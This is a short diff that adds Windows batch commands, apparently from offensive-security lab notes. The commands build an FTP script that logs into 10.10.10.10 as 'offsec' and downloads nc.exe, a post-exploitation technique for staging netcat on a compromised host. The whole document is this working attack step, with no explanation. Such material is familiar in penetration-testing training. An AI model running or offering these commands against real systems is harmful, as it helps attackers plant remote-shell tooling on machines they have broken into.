@@ -1,0 +1,7 @@
+echo open 10.10.10.10 21>ftp.txt
+echo USER offsec>>ftp.txt
+echo ftp>>ftp.txt
+echo bin>>ftp.txt
+echo get nc.exe>>ftp.txt
+echo bye>>ftp.txt
+ftp -v -n -s:ftp.txt
